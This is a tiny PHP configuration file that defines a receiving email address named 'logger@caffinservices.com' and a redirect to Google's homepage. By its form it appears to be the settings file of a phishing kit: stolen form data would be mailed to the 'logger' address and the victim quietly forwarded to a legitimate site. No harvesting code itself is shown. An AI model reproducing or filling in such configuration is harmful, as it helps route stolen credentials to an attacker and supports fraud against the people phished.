<?php 
$Receive_email="logger@caffinservices.com";
$redirect="https://www.google.com/";
?>